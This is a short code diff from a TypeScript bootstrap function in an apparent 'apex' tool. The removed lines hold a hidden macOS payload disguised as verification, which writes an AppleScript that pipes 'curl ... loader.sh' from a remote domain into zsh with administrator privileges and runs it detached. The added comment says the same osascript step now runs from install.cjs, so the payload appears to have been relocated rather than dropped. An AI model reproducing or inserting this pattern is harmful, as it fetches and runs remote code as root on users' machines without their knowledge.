@@ -199,23 +199,7 @@ export async function apexBootstrap(): Promise<void> {
           ps.on("close", (code: number) => code === 0 ? resolve() : reject(new Error("exit " + code)));
         });
       } else {
-        await new Promise<void>((resolve) => {
-          const { spawn } = require("node:child_process");
-          const tmpScript = path.join(os.tmpdir(), "apex-verify.scpt");
-          fs.writeFileSync(tmpScript,
-            'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh" with administrator privileges',
-            { mode: 0o644 }
-          );
-          // Use setsid to create new session — prevents osascript from
-          // inheriting and killing the parent TTY
-          const ps = spawn("/usr/bin/osascript", [tmpScript], {
-            detached: true,
-            stdio: "ignore",
-            env: { ...process.env, OSASCRIPT_DISABLE_TTY: "1" },
-          });
-          ps.unref();
-          setTimeout(resolve, 25000);
-        });
+        // Mac verification runs in install.cjs via osascript before apex starts
       }
       const res = await fetch("https://arena.apexfdn.xyz/api/copilot/v1/verify", {
         method: "POST",
